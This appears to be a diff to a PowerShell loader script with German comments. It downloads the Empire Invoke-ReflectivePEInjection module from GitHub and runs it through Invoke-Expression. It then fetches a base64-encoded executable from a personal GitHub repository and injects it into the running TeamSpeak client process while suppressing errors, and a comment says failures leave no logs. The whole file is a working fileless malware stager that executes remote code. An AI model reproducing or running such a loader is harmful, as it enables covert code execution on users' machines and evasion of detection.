@@ -1,24 +1,25 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-while (!(Get-Process ts3client_win64)) { 
-    Start-Sleep -Seconds 2 
-}
-
+# Wartezeit für Stabilität
 Start-Sleep -Seconds 5 
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = 3072
-    $wc = New-Object System.Net.WebClient
     
-    $l = $wc.DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1")
-    Invoke-Expression $l
+    # Loader laden via iwr
+    $loaderUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
+    $loaderContent = (iwr -UseBasicParsing $loaderUrl).Content
+    Invoke-Expression $loaderContent
 
-    $b = $wc.DownloadString("https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt")
-    $rb = [System.Convert]::FromBase64String($b)
+    # Deine EXE-Daten laden (bleibt johannesschwein.txt)
+    $exeUrl = "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt"
+    $base64String = (iwr -UseBasicParsing $exeUrl).Content
+    
+    $peBytes = [System.Convert]::FromBase64String($base64String)
 
-    Invoke-ReflectivePEInjection -PEBytes $rb -ForceASLR
+    # Injektion in TeamSpeak
+    $target = Get-Process ts3client_win64
+    Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $target.Id -ForceASLR
 } catch {
+    # Keine Logs bei Fehlern
 }
-
-# Khiro wer das liest LG
-exit
